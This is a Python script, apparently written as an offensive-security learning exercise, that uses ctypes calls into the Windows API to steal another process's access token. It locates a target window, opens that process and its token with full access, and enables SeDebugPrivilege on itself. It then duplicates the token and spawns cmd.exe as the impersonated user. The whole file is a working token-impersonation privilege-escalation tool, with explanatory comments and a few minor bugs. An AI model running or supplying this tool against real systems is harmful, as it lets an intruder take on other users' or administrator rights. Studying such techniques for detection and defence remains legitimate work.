# impersonator.py

import ctypes

from ctypes.wintypes import DWORD,BOOL,HANDLE,LPWSTR,WORD,LPBYTE

# Handles
u_handle = ctypes.WinDLL("user32.dll")
k_handle = ctypes.WinDLL("kernel32.dll")
a_handle = ctypes.WinDLL("Advapi32.dll")

# Access Rights (Full Access Right Shortcut)
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)

# Privilege Enabled Mask
SE_PRIVILEGE_ENABLED = 0x00000002
SE_PRIVILEGE_DISABLED = 0x00000000

# Token Access Rights
STANDARD_RIGHTS_REQUIRED = 0x000F0000
STANDARD_RIGHTS_READ = 0x00020000
TOKEN_ASSIGN_PRIMARY = 0x0001
TOKEN_DUPLICATE = 0x0002
TOKEN_IMPERSONATION = 0x0004
TOKEN_QUERY = 0x0008
TOKEN_QUERY_SOURCE = 0x0010
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_ADJUST_GROUPS = 0x0040
TOKEN_ADJUST_DEFAULT = 0x0080
TOKEN_ADJUST_SESSIONID = 0x0100
TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY)
TOKEN_ALL_ACCESS = ( STANDARD_RIGHTS_REQUIRED |
                     TOKEN_ASSIGN_PRIMARY     |
                     TOKEN_DUPLICATE          |
                     TOKEN_IMPERSONATION      |
                     TOKEN_QUERY              |
                     TOKEN_QUERY_SOURCE       |
                     TOKEN_ADJUST_PRIVILEGES  |
                     TOKEN_ADJUST_GROUPS      |
                     TOKEN_ADJUST_DEFAULT     |
                     TOKEN_ADJUST_SESSIONID)

# LUID Structure
class LUID(ctypes.Structure):
    _fields_ = [
    ("LowPart", DWORD),
    ("HighPart", DWORD),
    ]

# LUID and ATTRIBUTES
class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
    ("Luid", LUID),
    ("Attributes", DWORD),
    ]

# Privilege Set
class PRIVILEGE_SET(ctypes.Structure):
    _fields_ = [
    ("PrivilegeCount", DWORD),
    ("Control", DWORD),
    ("Privileges", LUID_AND_ATTRIBUTES),
    ]
 
# Token Set
class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [
    ("PrivilegeCount", DWORD),
    ("Privileges", LUID_AND_ATTRIBUTES),
    ]

# Security Attribute Set
class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
    ("nLength", DWORD),
    ("lpSecurityDescriptor", HANDLE),
    ("nInheritHandle", BOOL),
    ]
 
# Structure for Star        
class STARTUPINFO(ctypes.Structure):
    _fields_ = [
    ("cb", DWORD),
    ("lpReserved", LPWSTR),
    ("lpDesktop", LPWSTR),
    ("lpTitle", LPWSTR),
    ("dwX", DWORD),
    ("dwY", DWORD),
    ("dwXSize", DWORD),
    ("dwYSize", DWORD),
    ("dwXCountChars", DWORD),
    ("dwYCountChars", DWORD),
    ("dwFillAttribute", DWORD),
    ("dwFlags", DWORD),
    ("wShowWindow", WORD),
    ("cbReserved2", WORD),
    ("lpReserved2", LPBYTE),
    ("hStdInput", HANDLE),
    ("hStdOutput", HANDLE),
    ("hStdError", HANDLE),
    ] 

# Structure for Process Info
class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
    ("hProcess", HANDLE),
    ("hThread", HANDLE),
    ("dwProcessId", DWORD),
    ("dwThreadId", DWORD),
    ]

# [FUNCTION] Enable Privileges
def enablePrivilege(priv, handle):
    # 1) Use the LookupPrivilegeValueW API Call to get the LUID based on the String Privilege Name
    # 2) Setup a PRIVILEGE_SET for the PrivilegeCheck Call to be used later - We need the LUID to be used
    
    # BOOL PrivilegeCheck(
    #   HANDLE         ClientToken,
    #   PPRIVILEGE_SET RequiredPrivileges,
    #   LPBOOL         pfResult
    # );
    requiredPrivileges = PRIVILEGE_SET()
    requiredPrivileges.PrivilegeCount = 1   # We are only looking at 1 privilege at a time
    requiredPrivileges.Privileges = LUID_AND_ATTRIBUTES()   # Setup a new LUID_AND_ATTRIBUTES
    requiredPrivileges.Privileges.Luid = LUID() # Setup a new LUID inside of the LUID_AND_ATTRIBUTES structure
    
    # BOOL LookupPrivilegeValueW(
    #   LPCWSTR lpSystemName,
    #   LPCWSTR lpName,
    #   PLUID   lpLuid
    # );
    lpSystemName = None
    lpName = priv
    
    # Issue the call to configure the LUID with the Systems Value of that privilege
    response = a_handle.LookupPrivilegeValueW(lpSystemName, lpName, ctypes.byref(requiredPrivileges.Privileges.Luid))

    # Error Handling
    if response > 0:
        print("[INFO] Privilege Adjustment Success: {0}".format(priv))
    else:
        print("[ERROR] Privilege Adjustment Failed: {0}. [-] Error Code: {a}".format(priv, k_handle.GetLastError()))
        return 1

    # Check if the correct privilege is enabled
    pfResult = ctypes.c_long()

    response = a_handle.PrivilegeCheck(TokenHandle, ctypes.byref(requiredPrivileges), ctypes.byref(pfResult))

    # Error Handling
    if response > 0:
        print("[INFO] PrivilegeCheck Success!")
    else:
        print("[ERROR] PrivilegeCheck Failed! [-] Error Code: {0}".format(k_handle.GetLastError()))
        return 1

    if pfResult:
        print("[INFO] Privilege Enabled: {0}".format(priv))
        return 0
    else:
        print("[INFO] Privilege Disabled: {0}".format(priv))
        # Enabling the privilege if disabled
        print("[INFO] Enabling the Privilege...")
        requiredPrivileges.Privileges.Attributes = SE_PRIVILEGE_ENABLED

    # BOOL AdjustTokenPrivileges(
    #   HANDLE            TokenHandle,
    #   BOOL              DisableAllPrivileges,
    #   PTOKEN_PRIVILEGES NewState,
    #   DWORD             BufferLength,
    #   PTOKEN_PRIVILEGES PreviousState,
    #   PDWORD            ReturnLength
    # );
    DisableAllPrivileges = False
    NewState = TOKEN_PRIVILEGES()
    BufferLength = ctypes.sizeof(NewState)
    PreviousState = ctypes.c_void_p()
    ReturnLength = ctypes.c_void_p()

    # Configure Token Privilege
    NewState.PrivilegeCount = 1;
    NewState.Privileges = requiredPrivileges.Privileges

    response = a_handle.AdjustTokenPrivileges(
        TokenHandle, 
        DisableAllPrivileges, 
        ctypes.byref(NewState), 
        BufferLength, 
        ctypes.byref(PreviousState),
        ctypes.byref(ReturnLength))
        
    # Error Handling
    if response > 0:
        print("[INFO] AdjustTokenPrivileges Enabled: {0}".format(priv))
    else:
        print("[ERROR] AdjustTokenPrivileges Disabled: {0}. [-] Error Code: {0}".format(priv, k_handle.GetLastError()))
        return 1
        
    return 0

# [FUNCTION] Open Process
def openProcessByPID(pid):
    # HANDLE OpenProcess(
    # DWORD dwDesiredAccess,
    # BOOL bInheritHandle,
    # DWAORD dwProcessId
    # );
    dwDesiredAccess = PROCESS_ALL_ACCESS
    bInheritHandle = False
    dwProcessId = pid 

    hProcess = k_handle.OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId) 

    # Error Handling
    if hProcess <= 0:
        print("[Error] No Privilieged Handle Obtained... [-] Error Code: {0}".format(k_handle.GetLastError()))
        return 1
    else:
        print("[INFO] OpenProcess Handle Obtained:", hProcess)
        return hProcess

# [FUNCTION] Open a Process Token
def openProcToken(pHandle):
    # BOOL OpenProcessToken(
    #   HANDLE  ProcessHandle,
    #   DWORD   DesiredAccess,
    #   PHANDLE TokenHandle
    # );
    ProcessHandle = pHandle
    DesiredAccess = TOKEN_ALL_ACCESS
    TokenHandle = ctypes.c_void_p()

    response = k_handle.OpenProcessToken(ProcessHandle, DesiredAccess, ctypes.byref(TokenHandle))

    # Error Handling
    if response > 0:
        print("[INFO] OpenProcess Token Obtained: {0}".format(TokenHandle))
        return TokenHandle
    else:
        print("[ERROR] No Privilieged Token Obtained... [-] Error Code: {0}".format(k_handle.GetLastError()))
        return 1

# ============================================================================================================

# Grab the Windows Name from User32
lpClassName = None
lpWindowName = ctypes.c_char_p((input("[INPUT] Enter Window Name to Hook Into: ").encode('utf-8')))

# Grab a Handle to the Process
hWnd = u_handle.FindWindowA(lpClassName, lpWindowName)

# Error Handling
if hWnd == 0:
    print("[ERROR] No Handle Obtained... [-] Error Code: {0}".format(k_handle.GetLastError()))
    exit(1)
else:
    print("[INFO] Handle Obtained: {0}".format(hWnd))

# Get the PID of the Process at the Handle
# DWORD GetWindowThreadProcessId(
#  HWND    hWnd,
#  LPDWORD lpdwProcessId
# );
lpdwProcessId = ctypes.c_ulong()

# Use byref to pass a pointer to the value as needed by the API Call
response = u_handle.GetWindowThreadProcessId(hWnd, ctypes.byref(lpdwProcessId))

# Error Handling
if hWnd == 0:
    print("[Error] No PID Obtained... [-] Error Code: {0}".format(k_handle.GetLastError()))
else:
    pid = str(lpdwProcessId)
    print("[INFO] PID Obtained:", pid.strip("c_ulong()"))

# Open the Process and Grab a Table to its Token
print("[INFO] Getting TokenHandle...")
TokenHandle = openProcToken(openProcessByPID(lpdwProcessId))

# Get Handle of Current Process
print("[INFO] Getting CurrentProcessHandle...")
currentProcessHandle = openProcToken(openProcessByPID(k_handle.GetCurrentProcessId()))

# Attempt to Enable SeDebugPrivilege on Current Process to be able to use token duplication
print("[INFO] Enabling SEDebugPrivilege on Current Process...")
response = enablePrivilege("SEDebugPrivilege", currentProcessHandle)

if response != 0:
    print("[ERROR] Failed to Enable Privileges!")
    exit(1)
    
# Duplicate Token On Hooked Process
hExistingToken = ctypes.c_void_p()
dwDesiredAccess = TOKEN_ALL_ACCESS
lpTokenAttributes = SECURITY_ATTRIBUTES()
ImpersonationLevel = 2 # Set to SecurityImpersonation Enum
TokenType = 1 # Set to Token_Type enum as Primary

# Configure the SECURITY_ATTRIBUTES Structure
lpTokenAttributes.bInheritHandle = False
lpTokenAttributes.lpSecurityDescriptor = ctypes.c_void_p()
lpTokenAttributes.nLength = ctypes.sizeof(lpTokenAttributes)

print("[INFO] Duplicating Token on Hooked Process...")

# Issue the Token Duplication Call
response = a_handle.DuplicateTokenEx(
	TokenHandle,
	dwDesiredAccess,
	ctypes.byref(lpTokenAttributes),
	ImpersonationLevel,
	TokenType,
	ctypes.byref(hExistingToken))

if response == 0:
    print("[ERROR] Duplicating Token Failed [-] Error Code: {0}".format(k_handle.GetLastError()))
    exit(1)

# Spawn a Process as the Impersonated User    
# CreateProcessWithTokenW
hToken = hExistingToken
dwLogonFlags = 0x00000001 # Use the Flag LOGON_WITH_PROFILE
lpApplicationName = "C:\\Windows\\System32\\cmd.exe"
lpCommandLine = None
dwCreationFlags = 0x00000010 # Use the Flag CREATE_NEW_CONSOLE
lpEnvironment = ctypes.c_void_p()
lpCurrentDirectory = None
lpStartupInfo = STARTUPINFO()
lpProcessInformation = PROCESS_INFORMATION()

# StartupInfo (*If I don't sepcify the value, it will return as NULL)
lpStartupInfo.wShowWindow = 0x1 # Showing up Windows
lpStartupInfo.dwFlags = 0x1 # Use to flag to look at wShowWindow
lpStartupInfo.cb = ctypes.sizeof(lpStartupInfo)

response = a_handle.CreateProcessWithTokenW(
    hToken,
    dwLogonFlags,
    lpApplicationName,
    lpCommandLine,
    dwCreationFlags,
    lpEnvironment,
    lpCurrentDirectory,
    ctypes.byref(lpStartupInfo), # Pointer to STARTUPINFOA
    ctypes.byref(lpProcessInformation)) # Pointer to PROCESS_INFORMATION

if response == 0:
    print("[ERROR] Failed to Create a Process with Duplicated Token [-] Error Code: {0}".format(k_handle.GetLastError()))
    exit(1)
else:
    print("[INFO] Created Impersonated Process!")
